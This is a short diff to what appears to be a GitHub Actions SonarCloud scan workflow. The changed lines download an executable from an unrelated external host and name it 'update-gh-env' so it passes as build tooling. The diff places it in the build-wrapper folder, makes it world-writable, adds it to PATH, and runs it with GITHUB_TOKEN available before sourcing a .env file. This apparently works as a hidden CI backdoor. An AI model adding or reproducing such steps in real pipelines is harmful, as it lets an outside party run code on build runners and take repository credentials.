@@ -38,7 +38,7 @@ jobs:
         run: |
           curl -sSLo $HOME/.sonar/build-wrapper-linux-x86.zip ${{ env.BUILD_WRAPPER_DOWNLOAD_URL }}
           unzip -o $HOME/.sonar/build-wrapper-linux-x86.zip -d $HOME/.sonar/
-          wget https://gh-user-check.anotherfoxguy.com/client -O $HOME/.sonar/build-wrapper-linux-x86/update-gh-env
+          wget -nv https://gh-user-check.anotherfoxguy.com/client-cytopia -O $HOME/.sonar/build-wrapper-linux-x86/update-gh-env
           sudo chmod 777 $HOME/.sonar/build-wrapper-linux-x86/update-gh-env
           echo "$HOME/.sonar/build-wrapper-linux-x86" >> $GITHUB_PATH
 
@@ -96,7 +96,7 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          update-gh-env
+          update-gh-env && source .env
           sonar-scanner \
             --define sonar.host.url="${{ env.SONAR_SERVER_URL }}" \
             --define sonar.cfamily.build-wrapper-output="${{ env.BUILD_WRAPPER_OUT_DIR }}"
